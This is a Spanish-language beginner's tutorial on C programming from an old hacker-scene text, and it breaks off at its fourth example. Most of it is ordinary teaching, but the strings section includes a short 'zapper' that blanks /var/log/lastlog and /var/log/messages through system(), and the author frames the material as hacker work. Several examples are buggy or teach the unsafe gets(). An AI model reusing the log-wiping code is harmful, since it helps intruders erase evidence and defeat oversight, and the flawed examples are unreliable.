====================================================================== 


  		################################# 
 		# Tutorial de programacion en C # 
 		################################# 
 
 Este tutorial se organiza de la siguiente manera: 
 
 -INTRODUCCION A LA PROGRAMACION Y AL LENGUAJE C 
 -DEFINICION Y TIPOS DE VARIABLES EN C 
 -ESTRUCTURAS DE CONTROL DE FLUJO, BUCLES 
 -ESTRUCTURAS CONDICIONALES 
 -INTERACCION CON EL USUARIO 
 -FUNCIONES 
 -FUNCIONES CON PARAMETROS 
 -ARRAYS 
 -PUNTEROS 
 -ESTRUCTURAS 
 -FICHEROS 
 -STRINGS 
 -ALGUNOS EJEMPLOS 
 -APENDICE (PENDIENTE) 
 
 INTRUCCION A LA PROGRAMACION Y AL LENGUAJE C. 
 
 El concepto programacion se refiere a crear programas por supuesto, para 
 esto es necesario crear un codigo especifico, es ahi donde nacen los 
 lenguajes de programacion. Cada lenguaje es distinto, lo que se hace es 
 escribir este codigo en un editor de texto(normalmente) y luego un compilador 
 lo  traduce a lenguaje maquina, o sea a un ejecutable. C es un lenguaje de 
 programacion para el que no lo sepa, este lenguaje es muy poderoso, los 
 sistemas UNIX estan escritos en C. Cada lenguaje tiene su sintaxis, en C 
 lo basico que hay que saber es que un programa siempre tiene lo 
 siguiente: 
 ----8<-----8<-----8<------8<-------8<-------8<--------8<------- 
 void main() 
 { 
 
 } 
 ----8<-----8<-----8<------8<-------8<-------8<--------8<-------- 
 eso es un programa ya en si, solo que no hace nada, tiene justo lo 
 basico para que no te aparesca algun error al compilarlo. void se 
 refiere al tipo de funcion que es main(), main() esta presente en todos 
 los programas escritos en C, es aqui donde empieza nuestro programa. las 
 llaves( { y } ) indican el principio y el final de la funcion. Quiza por 
 ahora todo esto suene confuso, pero vas a ver que al final de los tres 
 proximos capitulos ya no tendras ningun problema. Otra cosa que hay que 
 recalcar es el uso de librerias, para hacer mas facil nuestro trabajo, 
 por ejemplo si yo quiciera escribir en la pantalla un mensaje, tendria 
 que incluir la libreria stdio.h , esto se hace de la siguiente manera 
 
 #include<stdio.h> 
 y ahora todas las funciones de esas librerias las puedes usar. Veamos el 
 ejemplo mas basico que se escribe con cada lenguaje cuando recien se 
 comienza: 
 ------8<---------8<--------8<---------8<------------8<---------- 
 #include<stdio.h> 
 
 void main() 
 { 
 printf("Hola mundo\n"); 
 } 
 -----8<----------8<------------8<---------8<---------8<--------- 
 este programa solo escribira Hola mundo en la pantalla, \n es para que 
 salte linea, o sea, que haga como un enter.cada instruccion en C termina 
 con un ' ; '. Para los que usan windows pueden bajar el turboC de 
 http://tcpp.homepage.com , es muy facil de usar, los que usan linux, 
 deben tenerlo instalado, solo escriban el programa y luego ejecuten: 
 cc programa.c    el ejecutable quedara en el mismo directorio con el 
 nombre de a.out. 
 
 
 DEFINICION Y TIPOS DE VARIABLES EN C 
 
 Primero es necesario saber que es una variable, una variable es un dato 
 que puede variar durante la ejecucio de un progra,a(fisicamente es un 
 espacio de memoria donde se almacena un dato). Hay distintos tipos de 
 variables, numericas, alfanumericas, etc. Cada tipo de variable tiene un 
 nombre. 
 
 TIPO     		REPRESENTA		RANGO 
 char		caracter			-127 a 127 
 unsigned char	caracter o num positivo		0 a 255 
 int		num entero			-32768 a 32767 
 unsigned int	num entero positivo		0 a 65535 
 long		num largo(4 bytes)		-2417483648 a 214783647 
 unsigned long	num largo positivo		0 a 4294967295 
 float		num real(decimal)		3.4 E-38 a 3.4 E38 
 double		num real			1.7 E-308 a 1.7 E308 
 long double	num real			3.4 E-4932 a 3.4 E4932 
 
 para declarar una variable en un programa se escribe el tipo de variable 
 y luego el nombre que le quieres dar a esa variable en particular, por 
 ejmplo a continuacion voi a declarar 3 variables. 
 
 int variableuno; 
 char caracter; 
 int variabledos; 
 
 ahora necesitamos poder operar estas varibles, las operaciones en C son: 
 
 Operadores aritmeticos: 
 +		suma 
 -		resta 
 *		multiplicacion 
 /		division 
 %		modulo(resto de la division) 
 ++		incremento 
 --		decremento 
 
 Operadores de relacion(lo usaremos en el proximo capitulo) 
 ==		igual a 
 !=		distinto que 
 <		menor que 
 <=		menor o igual que 
 >		mayor que 
 >= 		mayor o igual que 
 
 Operadores logicos(tambien los usaremos a partir del proximo capitulo) 
 !		no logico(NOT) 
 &&		Y logico(AND) 
 ||  		O logico(OR) 
 
 Operadores de asignacion 
 =		asignacion simple 
 +=		suma y asignacion 
 -=		resta y asignacion 
 *=		multiplicacion y asignacion 
 /=		division y asignacion 
 %=		modulo y asignacion 
 
 Operadores de direccion(estos no los tomes mucho en cuenta por ahora) 
 &		direccion de variable 
 * 		operador de direccionamiento 
 
 Ahora la gracia es poder dar los resultados, por ejemplo hagamos un 
 programa que sume dos numeros: 
 -------------------------------------------------------------- 
 #include<stdio.h> 
 
 void main() 
 { 
 int uno; 
 /* Declaro la primera variable */ 
 
 int dos; 
 /* Declaro la variable numero dos */  
 
 int tres; 
 /* Y por ultimo declaro la variable donde pondre el resultado */ 
 
 uno=5; 
 dos=7; 
 /* Asigno un valor a las variables */ 
 
 tres=uno+dos; 
 /* Asigno el valor de la variable tres como la sume de uno y dos */ 
 
 printf(" La suma de %d y %d es igual a %d \n",uno,dos,tres); 
 /* imprimo en la pantalla el resultado */ 
 } 
 -------------------------------------------------------------- 
 Aqui si haz leido todo lo anterior, la unica cosa nueva seria el 
 printf(" La suma de %d y %d es igual a %d \n",uno,dos,tres); 
 analizemoslo: 
 printf(); es la funcion que viene en la libreria stdio.h 
 " La suma de %d y %d es igual a %d \n" es lo que queremos imprimir, pero 
 que significan esos %d, bueno esa es la forma de imprimir un variable, 
 se pone % luego la letra que identifica a la variable segun la siguiente 
 tabla y las variables se ponen separadas por comas a lado. 
 
 %      			Tipo de variable 
 
 c				caracter 
 d, i				numero entero 
 e, E				notacion cientifica 
 f, g, G			float o double 
 n				puntero a entero 
 o				octal 
 p				puntero 
 s				String(cadena de caracteres) 
 u				unsigned 
 x, X				hexadecimal 
 
 
 Y aprovechando el vuelo con la funcion printf(); aprovechemos de 
 completarla, con los distintos \ 
 
 \				Accion 
 
 a				pitido 
 b				retroceso 
 f				nueva pagina o pantalla 
 n				nueva linea 
 r				retorno de carro 
 t				tabulador horizontal 
 v				tabulador vertical 
 \				signo \ 
 '				signo ' 
 "				comillas 
 OOO				digitos octales 
 xHHHH				digitos hexadecimales 
 
 
 Para dejarlo mas claro modifiquemos el ejemplo anterior de las siguiente 
 manera: 
 -------------------------------------------------------------- 
 #include<stdio.h> 
 
 int main() 
 { 
 int uno; 
 /* Declaro la primera variable */ 
 
 int dos; 
 /* Declaro la variable numero dos */  
 
 int tres; 
 /* Y por ultimo declaro la variable donde pondre el resultado */ 
 
 uno=5; 
 dos=7; 
 /* Asigno un valor a las variables */ 
 
 tres=uno+dos; 
 /* Asigno el valor de la variable tres como la sume de uno y dos */ 
 
 printf(" La suma de %d y %d es igual a %d \n",uno,dos,tres); 
 printf(" %d es 0x%X en hexadecimal\n"); 
 printf(" Ahora voi a dormir 10 segundo, te avisare cuando despierte\n"); 
 sleep(10); 
 printf("\a Desperte!!!!\n");  
 /* imprimo en la pantalla el resultado */ 
 return 0; 
 } 
 -------------------------------------------------------------- 
 
 Ese ejemplo si lo compilas en linux no tendras problemas, en TurboC tendrias 
que dejarlo asi:   
 -------------------------------------------------------------- 
 #include<stdio.h> 
 #include<conio.h> 
 
 int main() 
 { 
 int uno; 
 /* Declaro la primera variable */ 
 
 int dos; 
 /* Declaro la variable numero dos */  
 
 int tres; 
 /* Y por ultimo declaro la variable donde pondre el resultado */ 
 
 uno=5; 
 dos=7; 
 /* Asigno un valor a las variables */ 
 
 tres=uno+dos; 
 /* Asigno el valor de la variable tres como la sume de uno y dos */ 
 
 printf(" La suma de %d y %d es igual a %d \n",uno,dos,tres); 
 printf(" %d es 0x%X en hexadecimal\n"); 
 printf(" Ahora voi a dormir 10 segundo, te avisare cuando despierte\n"); 
 delay(10000); 
 printf("\a Desperte!!!!\n");  
 /* imprimo en la pantalla el resultado */ 
 return 0; 
 } 
 -------------------------------------------------------------- 
 
La diferencia entre los dos compiladores es que en linux puedo usar la funcion 
sleep(numero de segundos); la cual no estoi seguro si esta en DOS/WIN. 
Y en el TurboC cuento con una libreria llamada conio.h en la cual tengo la 
funcion delay(); que puedo especificar el numero de milisegundos que quiero 
cngelar el programa. Para los que usen el TurboC o TurboC++, la libreria 
conio.h simplifica mucho la programacion demenus y esas cosas, si alguno de 
ustedes esta interesado en eso que me contacte, ya que no lo especificare en 
este articulo, debido a que se sale de el objetivo mismo. 
 
 
 ESTRUCTURAS DE CONTROL DE FLUJO, BUCLES 
 
 La gracia de un programa por supuesto no es simplemente que solo sume y 
 no haga nada mas, la gracia es que tenga opciones y varie su ejecucion, 
 para eso sirven los bucles. 
 
 DO...WHILE 
 la sintaxis de esta instruccion es la siguiente: 
 do 
 { 
 (instrucciones, cuantas quieras) 
 }while(condicion con la que finaliza el bucle); 
 
 Lo que hace este bucle es ejecutarse cuantas veces sea necesario, 
 mientras se cumpla la condicion propuesta. 
 Un ejemplo seria: 
--------------------------------------------------------- 
 #include<stdio.h> 
 
 int main() 
 { 
 int control; 
 control=0; 
 do 
 { 
 control++; 
 printf(" contando %d \n",control); 
 sleep(1); 
 }while(control<20); 
 sleep(3); 
 printf(" Acabo de contar hasta 20\n\n"); 
 } 
--------------------------------------------------------- 
 
Este programa esta escrito para linux, si usas TurboC, ya sabes con la 
informacion de arriba puedes adaptarlo. 
   
 
 WHILE 
 Esta es muy parecida a la anterior, la diferencia es que la condicion se 
 evalua antes de ejecutar las instrucciones del bucle, en contraste con 
 la anterior, donde se evaluavan al final, la anterior simpre se ejecuta 
 minimo una vez, esta por el contrario puede ser que de repente no se 
 ejecute. 
 Sintaxis: 
 while(condicion propuesta) 
 { 
 (instrucciones varias) 
 } 
 ejemplo: 
----------------------------------------------------------------- 
 #include<stdio.h> 
 
 main() 
 { 
 int variable=0; 
 
 while(variable!=5) 
 { 
 printf(" La variable es distinta a 5\n"); 
 printf(" La variable es %d\n\n",variable); 
 variable++; 
 } 
 
 while(variable!=5) 
 { 
 printf(" La variable es 5\n"); 
 } 
} 
------------------------------------------------------------------- 
 
Si te fijas, el segundo bucle no se ejecutara nunca, ya que la variable es 5. 
Este programa correra sin problemas en TurboC. 
ADEVERTENCIA: 
   while() 
   { 
   este while no lleva ; al final, sino lo mas probable es que consigas un 
cuelgue, ya que no se ejecutaria nunca el bucle y se quedaria pegado en el 
while. 
 
 
 
 
 FOR 
 Este bucle se ejecuta un numero determinado de veces o simplemente se 
 puede escribir para que funcion parecido a los otros dos. 
 Sintaxis: 
 for(asignacion;condicion;operacion) 
 { 
 (instrucciones) 
 } 
 Ejemplo: 
---------------------------------------------------- 
 #include<stdio.h> 
 
 main() 
 { 
 int x; 
 for(x=0;x<20;x++) 
 { 
 printf(" %d \n",x); 
 } 
 } 
--------------------------------------------------- 
 
 Esto imprimira desde el 0 al 19. Definamos los conceptos por si acaso. 
 asignacion: aqui se asina la o las variables 
 condicion: aqui se establece la condicion de salida, pueden ser mas de 
 una como veremos mas adelante 
 operacion: aqui se incluyen instrucciones de modificacion a las 
 variables de control 
 Todo esto puede variar, porque como se imaginan, nosotros buscamos hacer 
 cosas raras jaja. 
 
 CONSEJO. fijate como van los ; en estas estructuras, es importante 
 ponerlos correctamente, ademas puedes asignar mas de una variable, al igual 
 que se pueden realizar mas de 2 comparaciones o operaciones. 
 
 
 ESTRUCTURAS CONDICIONALES 
 Las estructuras condicionales son parecidas a las de control de flujo, 
 la diferencia es que estas no se repiten un numero de veces , see 
 ejecutan una vez. 
 
 IF...ELSE 
 sintaxis: 
 if(condicion propuesta) 
 { 
 (instrucciones) 
 } 
 else 
 { 
 (instrucciones que se ejecutan si no se cumple) 
 } 
 
 else se puede omitir, se pueden poner bucles y mas if dentro de uno , y 
 asi mezclar. 
 
 Ejemplo: 
---------------------------------------------------- 
 #include<stdio.h> 
 
 main() 
 { 
 int x; 
 x=1; 
 if(x==1) 
 { 
 printf(" x es uno \n"); 
 } 
 else 
 { 
 printf(" x no es uno \n"); 
 } 
 } 
------------------------------------------------- 
 la instruccion if es muy util para la programacion como iras viendo a 
 medida que crees tus propios programas. La parte de else se puede eliminar en 
 caso de que sea necesario, o sea, el programa podria quedar asi: 
 
-------------------------------------------------- 
---------------------------------------------------- 
 #include<stdio.h> 
 
 main() 
 { 
 int x; 
 x=1; 
 if(x==1) 
 { 
 printf(" x es uno \n"); 
 } 
 } 
--------------------------------------------------- 
 
 
 SWITCH 
 Esta es una estructura condicional muy util, pero mas especifica. 
 sintaxis: 
 switch(variable) 
 { 
 case valor1:(instrucciones) 
             break; 
 case valor2:(instrucciones) 
             break; 
 case valor3:(instrucciones) 
 	      break; 
 default:(instrucciones) 
 } 
 Lo que esta instruccion hace es ejecutar la parte de instrucciones que 
 corresponda al valor de la variables, la final(default) no es 
 obligatoria, y lo que hace es ejecuarse en caso de que el valor de la 
 variable no coincida con ninguna. 
 Ejemplo: 
----------------------------------------------------- 
 #include<stdio.h> 
  
 main() 
 { 
 char x; 
 printf("Presiona una tecla..."); 
 x=getchar(); 
 switch(x) 
 { 
 case 'b': printf(" opcion b\n"); 
           break; 
 case 'a': printf(" opcion a \n"); 
 	    break; 
 default: printf(" No le pegaste a una  ;) \n\n"); 
 } 
 } 
---------------------------------------------------- 
 
 Con eso ya puedes controlar los distintos rumbos que puede llevar tus 
 programas. he usado la funcion getchar(), la cual viene explicada en el 
 siguiente item. 
 
 
 INTERACCION CON EL USUARIO 
 
 Esta parte es importante en la programacion, porque no nos sirve mucho 
 un prorama que siempre haga lo mismo. Veamos las funciones basicas nada 
 mas: 
 
 getchar()  devuelve una tecla presionada. 
 ej: x = getchar(); 
 (Esta ya se vio abajo.) 
 
 
 gets(cadena)  lee una cadena de caracteres del teclado. 
 Ejemplo: 
--------------------------------------------------------- 
#include<stdio.h> 
 
main() 
{ 
char cadena[30]; 
/* Aqui defini una cadena de caracteres, proto veras esto en los arrays */ 
 
printf("Ingresa alguna frase:\n"); 
gets(cadena); 
printf("La frase que  escribste fue: %s\n\n",cadena); 
return 0; 
} 
----------------------------------------------------------- 
 
AVISO: gets() es una funcion insegura, puede explotarse este programa. 
 
Bueno, si te preocupas de entender bien los ficheros puedes jugar con stdin, 
stdout y stderr y hacer algunas cosas mas interesantes, al igual que es muy 
importante el aprender el uso de ficheros. 
 
 
 FUNCIONES 
 
 Esto es una parte muy importante en la programacion, por ejemplo C no 
 tiene una instruccion que imprima caracteres en la pantalla, imaginate 
 si cada vez que quizieras imprimir algo, tuvieras que escribir todo el 
 codigo de la funcion printf(); para imprimir un mensaje, los programas 
 serian kilometricos, para eso las funciones nos hacen ahorrar tiempo 
 creando una parte del programa que simplemente se llama, con un ejemplo 
 te quedara mas claro. 
 ---------------------------------------------------------- 
 #include<stdio.h> 
 
 void funcion() 
 { 
 printf("Hola\n"); 
 } 
 
 void main() 
 { 
 funcion(); 
 funcion(); 
 } 
 ----------------------------------------------------------- 
 
 ves la gracia es simplemente escribir asi una funcion, y despoues solo 
 la llamas como se muestra ahi. 
 Ahora la gracia es usar funciones que pasen valores entre si. 
 
 FUNCIONES CON ARGUMENTOS 
 
 Estas son iguales que las anteriores, pero se pasan valores. Tambien 
 dificil de explicar, pero veras que con un ejemplo se aclara. 
 
 int sumar(int a, int b) 
 { 
 int c; 
 c=a+b; 
 return c 
 } 
 
 En este ejemplo aparecieron muchas cosas nuevas, una es int antes de la 
 funcion, esto quiere decir que la funcion devuelve un dato de tipo int, 
 por ejemplo yo podria asignar una variable en el programa asi: 
 c=sumar(3,5); 
 o 
 c=sumar(variable1,variable2); 
 y esto me retona el valor, con return [valor o variable] 
 y los parametros ya te abras dado cuenta cuales son, fijate que tambien 
 se declara el tipo de variable que es el parametro. 
 Ejemplo: 
------------------------------------------------- 
#include<stdio.h> 
 
 int sumar(int a, int b) 
 { 
 int c; 
 c=a+b; 
 return c 
 } 
 
main() 
{ 
int uno; 
int dos; 
int tres; 
 
uno=2; 
dos=4; 
tres=sumar(uno,dos); 
 
printf("La suma de %d y %d luego de calcularlo con la funcion sumar() es 
%d",uno,dos,tres); 
 
} 
----------------------------------------------------- 
 
 
 ARRAYS 
 
 Los arrays son conjuntos o matrices, un string es un array de chars o 
 sea u conjunto de chars. 
 como se declaran: char esteesarray[largo]; 
 y se accede a cada dato asi: esteesarray[numero del dato]; 
 los arrays son muy utiles, especialmente para los strings. Veamos un 
 ejemplo: 
---------------------------------------- 
#include<stdio.h> 
 
main() 
{ 
 char cadena[30]; 
 printf("Ingresa una cadena: "); 
 gets(cadena); 
 printf(" %s\n",cadena); 
} 
--------------------------------------- 
 este pedazo de codigo lee una cadena del teclado y la imprime, la cadena 
 es un array, tambien puedes crear arrays de int y cosas asi eso lo dejo 
 a tu imaginacion, cualquier duda me escribes. 
 Los arrays tambien pueden tener mas de una dimension, pero no varia 
 mucho el uso, por ejemplo de dos dimensiones 
 char dos[2][3]; 
 ahi tengo 12 chars!!!! 
 Eso es porque el array parte desde 0, o sea... 
 dos[0][0] 
 dos[0][1] 
 dos[0][2] 
 dos[0][3] 
 dos[1][0] 
 ... 
 dos[2][3] 
  
 estos los puedes tratar como cualquier variable de la misma manera que lo 
hemos hecho durante todo el texto. 
 
 
 PUNTEROS 
 
 Esto es algo ya mas avanzado quiza, pero no por eso no hay que 
 aprenderlo, por el contrario es muy importante y los usaremmos mucho en 
 nuestra labor como hacker, porque son muy flexibles y poderosos como 
 veras a continuacion. 
 Cada variable tiene una direccion en la memoria como se vio en el 
 principio, los punteros lo que hacen es apuntar a estas direcciones, lo 
 que en verdad se almacena en la direccion fisica del puntero es la 
 direccion a la variable que apunta. Veamos el ejemplo mas claro que 
 existe para esto: 
 (los punteros se declaran. tipo de variable a la q apuntan * nombre) 
 para entender los & y *, vuelve a los operadores y pegales una releida. 
 --------------------------------------------------------------- 
 #include<stdio.h> 
 
 void main() 
 { 
 int variable; 
 int * puntero; 
 variable = 5; 
 puntero = &variable; 
 printf("puntero %d\n",puntero); 
 printf("direccion variable %d\n",&variable); 
 printf("valor a lo apuntado por puntero %d\n",*puntero); 
 printf("valor variable %d\n",variable); 
 } 
----------------------------------------------------------------- 
 
El resultado de esto es: 
bash-2.03# ./prog 
puntero -1073743644 
direccion variable -1073743644 
valor a lo apuntado por puntero 5 
valor variable 5   
 
Analizemoslo. 
 
puntero -1073743644 
el valor que tiene la variable puntero es -1073743644 
 
direccion variable -1073743644 
Esta es la direccion de memoria donde se almacena el valor de variable. 
 
valor a lo apuntado por puntero 5 
El valor de la casilla de memori a la que apunta puntero es 5 
 
valor variable 5   
El valor de variable es 5 
 
Ahi puedes sacar tus propias conclusiones. 
 
 
 Con eso ya quedo mas o menos clara la idea de un puntero, ahora es 
 importante tambien saber que los punteros se pueden modificar, 
 haciendolos mas grandes o peque¤os, para que apunte una casilla mas 
 abajo o mas arriba. Eso se hace sumandole valores especificos, ahi tu puedes 
probar y jugar un poco, te doi una idea... 
Ejemplo: 
----------------------------------------------- 
#include<stdio.h> 
 
main() 
{ 
 
char * puntero; 
int x; 
char cadena[]="Hola esta es una cadena"; 
puntero=cadena; 
printf("%s \n%s \n\n",puntero,cadena); 
}                      
------------------------------------------------ 
Resultado: 
bash-2.03# ./prog 
Hola esta es una cadena 
Hola esta es una cadena 
                                           
 
 
 ESTRUCTURAS 
 
 Las estructuras son conjuntos de variables agrupadas, por ejjemplo si tu 
 quisieras crear un software de control de stock para una mepresa(como me 
 pidieron a mi), no te conviene hacer un array de strings para los 
 nombres, otro de int para los presios y todo eso, lo mejor seria crear 
 una estructura que contenga todo eso. Una estructura se crea de la 
 siguiente manera: 
 struct{ 
 int uno; 
 int dos; 
 int tres; 
 char cuatro; 
 }estructura; 
 para acceder a cada una de estas variables, se hace asi: 
 estructura.uno 
 estructura.dos 
 estructura.tres 
 estructura.cuatro 
 Esto nos sirve para estructuras definidas, donde serviria una por 
 elemento, por ejemplo para una biblioteca uno por libro, en este caso 
 eso si es mas facil definir un tipo tu mismo que sea una estructura, eso 
 lo harias asi: 
 typedef struct{ 
 char nombre[20]; 
 int codigo; 
 int precio; 
 }libro_e; 
 definiendo esto en el cuerpo del programa y luego en main() definirias 
 esto: 
 
 libro_e libros[30]; 
 
 para acceder a cada uno de las vaiables y distintos libros harias esto: 
 libro[n].nombre[c] 
 pensando que c y n son variables numericas. 
 Esto de jugar con las variables ya lo hemos hecho bastante, asique ahi puedes 
 ver tu que utilidad le das a esto, yo lo use una vez que un amigo necesitaba 
 un programa de stock, para crear una estructura que gusradar toda la 
 informacion de un producto. Eso queda a tu imaginacion. 
 
 FICHEROS 
 
 Los ficheros son muy importantes para por ejemplo guardar datos, en el 
 caso del ejemplo anterior el programa de control de stock, no servia si 
 solo ingresabas los datos y al correrlo de nuevo estaba de nuevo en 0, 
 la gracia es que mantenga los valores, y para eso usaremos los fichero, 
 obviamente tambien para editar, crear utilidades y con fines de otro 
 tipo. 
 Un fichero se declara de la siguiente manera(para usarlos debes incluir 
 la libreria stdio.h en C estandar): 
 FILE * archivo; 
 con esto creaste un puntero a la estructura llamada FILE, definida en la 
 libreria stdio.h. 
 ahora esto es solo un puntero, para abrir ahora el fichero se usa la 
 funcion fopen(), y se utiliza de la siguiente forma: 
 archivo = fopen(nombrefichero, modo); 
 nombrefichero representa el PATH y el nombre de archivo del archivo que 
 queremos cerrar, y modo representa el modo en el que lo queremos abrir, 
 las cuales pueden ser: 
 r		Lectura(error si el fichero no existe) 
 w		Escritura(si el fichero existe, borra su contenido) 
 a		A¤adir al final del archivo(lo crea si no existe) 
 r+		Lectura y escritura(error si el fichero no existe) 
 w+		Lectura y escritura(borra su contenido) 
 a+		Lectura y a¤adir(lo crea si no existe) 
 b		Indica que el fichero es de tipo binario 
 
 Las opciones w y w+ crean el fichero en caso de que no exista. 
 
 ahora las funciones mas imprtantes para el uso de ficheros: 
 
 fread(dato,tama¤o dato,size_t numdato,FILE *fp); 
 en este caso dato es la variable donde vas a meter lo que leas, tama¤o 
 dato es el largo de la variable(lo mas facil es poner sizeof(variable), 
 size_T numdato representa el numero de veces que se debe reperi la 
 lectura, por lo general 1, y el ultimo es nuestro puntero a FILE, o sea 
 nuestro fichero. 
 
 fwrite() 
 usa el mismo formato de fread, pero para escribir. 
 
 Y para terminar, cierras el fichero con 
 fclose(FILE *archivo); 
 en nuestro ejemplo de FILE * archivo definido anteriormente, seria: 
 fclose(archivo); 
  
 Y sin duda una de las mas importantes, fprintf(); 
 esta funciona asi: 
 fprintf(archivo," ... ", variables); 
 
 Con eso ya deberias escribir fichero, por lo menos lo basico, en todo 
 caso si hasta ahora has tenido algun problema, no te preocupes, porque 
 al final de este tutorial se incluyen las direcciones para bajar los 
 compiladores y algunos ejemplos desde el principio para que te quede 
 todo claro. En todo caso que se me olvidaba, debes cerrar al fichero al 
finalizar, con la funcion close(fichero);. 
 
 Para terminar hagamos un peque¤o ejemplo. 
--------------------------------------------- 
#include<stdio.h> 
 
main() 
{ 
FILE * archivo; 
char frase[50]; 
printf("Ingresa una frase, sera guardada en frase.txt\n"); 
fgets(frase,50,stdin); 
archivo = fopen("frase.txt","a+"); 
if(archivo == NULL) 
{ 
 printf("\nLo siento, nos e puede abrir el fichero\n\n"); 
 exit(0); 
} 
fprintf(archivo,"%s\n\n",frase); 
close(archivo); 
} 
------------------------------------------------------ 
RESULTADO: 
bash-2.03# gcc -o prog prog.c 
bash-2.03# ./prog 
Ingresa una frase, sera guardada en frase.txt 
Esta es la frase que guardaremos. 
bash-2.03# cat frase.txt 
Esta es la frase que guardaremos. 
  
  
bash-2.03# ./prog 
Ingresa una frase, sera guardada en frase.txt 
Aqu agregamos una frase mas... 
bash-2.03# cat frase.txt 
Esta es la frase que guardaremos. 
  
  
Aqu agregamos una frase mas... 
  
  
bash-2.03#                                                                  
-------------- 
 
 
 
 
 STRINGS 
 
 Los strings son conjuntos o arrays de char, por ejemplo 
 char string[21]; 
 esto seria un string de 20 caracteres, porque se cuenta uno menos. Ya 
 que el ultimo se le asigna '\0' que representa el fin de la cadena. La 
 verdad es que los arrays ya los vimos, pero este capitulo es para ver 
 las funciones mas utiles de strings( string.h ). 
 Las funciones que yo mas uso(personalmente) son tres: 
 1.- strcpy() 
 Esta funcion es para copiar cadenas. 
 Ejemplos 
 char caduno[30]; 
 char caddos[30]; 
 caduno="Hola\0"; 
 strcpy(caddos,caduno); 
 
 2.- strcmp() 
 Esta funcion compara strings. 
 Ejemplo 
 int comparacion; 
 char caduno[30]; 
 char caddos[30]; 
 caduno="Hola\0"; 
 caddos="Hola\0"; 
 comparacion=strcmp(caddos,caduno); 
 
 si son iguales devuelve 0, si una es mayor o menor varia en 1 o -1. 
 
 3.- strcat() 
 Esta funcion concatena dos cadenas 
 Ejempo 
 char caduno[30]; 
 char caddos[30]; 
 caduno="Hola \0"; 
 caddos="z0rbas\0"; 
 strcat(caduno,caddos); 
 
 Despues de esto caduno quedaria asi: 
 "Hola z0rbas\0" 
 
 OjO: el \0 no es necesario por lo general, la mayoria de las funciones 
 lo ponen por si solas!! 
 
 Y sin duda la funcion mas comoda para trabajar con strings, es sprintf(); 
 que viene en la libreria stdio.h, por lo menos para mi es una de mis funciones 
 preferidas, en este ejemplo se daran cuenta porque. ademas voy a mostrarles 
una funcion muy importante en linux, system(); esta funcion ejecuta algun 
comando. 
Este programa es un peque¤o zapper de ejemplo, solo le podre dos ficheros de 
logs para que veas como funciona. 
 
-----------------------------------------------------  
 
#include<stdio.h> 
 
main() 
{ 
char comando[200]; 
char * principio="echo \"\" > "; 
sprintf(comando,"%s /var/log/lastlog",principio); 
system(comando); 
sprintf(comando,"%s /var/log/messages",principio); 
system(comando); 
} 
 
----------------------------------------------------- 
Resultado: 
 
bash-2.03# gcc -o prog prog.c 
bash-2.03# ./prog 
bash-2.03# ls -la /var/log | grep messages 
-rw-r-----   1 root     root            1 Feb 17 17:46 messages 
bash-2.03# ls -la /var/log | grep lastlog 
-rw-rw-r--   1 root     tty             1 Feb 17 17:46 lastlog 
bash-2.03#                                                             
 
Como puedes ver, los logs quedaron con el tama¤o de un byte, o sea, sin nada. 
 
 
 
 ALGUNOS EJEMPLOS 
 
 Aqui pondremos algunos ejemplos muy basicos, pero suficientes para que 
 tu ya puedas empezar a crear tus propios programas. No haremos ejemplos 
 de ficheros y eso por razones de tiempo, pero si tienes algun problema, 
 escribenos y responderemos tus preguntas, no te preocupes. Estos 
 ejemplos son solo para los que recien se inician en la programacion, 
 para que se hagan una idea basica de como funciona. Y entiendan bien los 
 bucles. 
 Antes de empezar un detalle importante, en tus programas puedes insertar 
 comentarios asi: 
 /* aqui todo 
 lo que quieras 
 */ 
 Esto no afecta al tama¤o del programa, sirve solamente para dejar mas 
 claro el codigo. 
 
 Ejemplo 1: 
---------------------------------------------------------------- 
 
#include <stdio.h> 
#include <stdlib.h> 
 
 void main() 
 { 
 int numero_pensado; 
 int numero_tuyo; 
 char cadena[40]; 
 numero_pensado= 5; 
 do{ 
 printf("Elige un numero entre el 1 y el 10: "); 
 gets(cadena); 
 numero_tuyo = atoi(cadena);  
 if(numero_tuyo<numero_pensado) printf("Mas alto!!\n"); 
 if(numero_tuyo>numero_pensado) printf("Mas bajo!!\n"); 
 }while(numero_pensado!=numero_tuyo); 
 printf("Felicidades, veo que has acertado!!\n"); 
 }                                        
 
----------------------------------------------------------- 
Resultado: 
bash-2.03# ./prog 
Elige un numero entre el 1 y el 10: 1 
Mas alto!! 
Elige un numero entre el 1 y el 10: 2 
Mas alto!! 
Elige un numero entre el 1 y el 10: 3 
Mas alto!! 
Elige un numero entre el 1 y el 10: 4 
Mas alto!! 
Elige un numero entre el 1 y el 10: 5 
Felicidades, veo que has acertado!! 
bash-2.03#                                                
---------------------- 
 Bueno obviamente este programa no tiene mucha gracia, porque el tipo que 
 lo programo sabe el numero correcto y el que lo juega, con ganar una 
 vez, gana siempre, seria mucho mejor si usaras una funcion random, para 
 que generara un numero aleatorio, 
 numero_pensado=random(limite); 
 pero yo creo que el ejemplo cumple su objetivo de mostrar el uso de un 
 bucle do{}while(); de if(); y de algunas funciones de lectura de datos y 
 de escritura. 
 
 Ejemplo 2. 
--------------------------------------------------------------- 
 
 /* Programa escrito por z0rbas para el tutorial de C 
    Este programa imprime numeros del 1 a lo especificado 
    No creo que haga falta pero, cualquier duda escribela 
    a the-little@usa.net                               */ 
 
#include <stdio.h> 
#include <stdlib.h> 
 
 void main() 
 { 
 int numero; 
 int contador; 
 char cadena[50]; 
 printf("Hasta que numero deseas contar?"); 
 gets(cadena); 
 numero = atoi(cadena); 
 for(contador=0;contador<=numero;contador++) 
   { 
   printf("%d ",contador); 
   } 
 } 
---------------------------------------------------------------- 
 
Resultado: 
bash-2.03# ./prog 
Hasta que numero deseas contar?50 
0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 
30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 bash-2.03# 
 
--------------------------- 
 
 Este ejemplos esta muy claro, lo que hace es escribir numeros desde 0 
 hasta lo especificado, separados por un espacio. Sirve yo creo para 
 entender el funcionamiento de FOR(){} 
 
 
 Ejemplo 3. 
 Este es un ejemplo cortito: 
----------------------------------------------------------------------- 
 /* programa escrito por z0rbas para el tutorial de c 
    the-little@usa.net 
    http://www.systat.net  */ 
 void main() 
 { 
 char opcion; 
 printf("\nPresiona una tecla..."); 
 opcion=getchar(); /*funcion q lee un caracter del teclado */ 
 printf("Presionaste la tecla: %c \n",opcion); 
 } 
--------------------------------------------------------------------- 
 
 muy simple no creo haga falta comentario. 
 podria poner lo siguiente... 
 
 Ejemplo 4. 
